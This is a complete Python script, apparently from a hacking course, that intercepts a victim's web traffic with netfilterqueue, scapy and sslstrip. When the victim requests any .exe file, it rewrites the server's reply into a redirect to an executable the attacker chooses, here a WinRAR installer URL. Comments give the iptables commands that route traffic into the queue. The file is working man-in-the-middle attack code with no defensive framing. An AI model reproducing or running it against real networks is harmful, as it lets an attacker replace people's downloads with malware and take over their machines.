#!/usr/bin/env python

# use command (   iptables -I OUTPUT -j NFQUEUE --queue-num 0   )
# use command (   iptables -I INPUT -j NFQUEUE --queue-num 0   )
import netfilterqueue
import scapy.all as scapy

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # wrapping packet with scapy IP layer
    if scapy_packet.haslayer(scapy.Raw):
        # if scapy_packet[scapy.TCP].dport == 80:
        if scapy_packet[scapy.TCP].dport == 10000: # using sslstrip
            if ".exe" in scapy_packet[scapy.Raw].load and "www.rarlab.com" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        # elif scapy_packet[scapy.TCP].sport == 80:
        elif scapy_packet[scapy.TCP].sport == 10000: # using sslstrip
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: "
                                                         "https://www.rarlab.com/rar/winrar-x64-591ar.exe\n\n")
                packet.set_payload(str(modified_packet))

    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
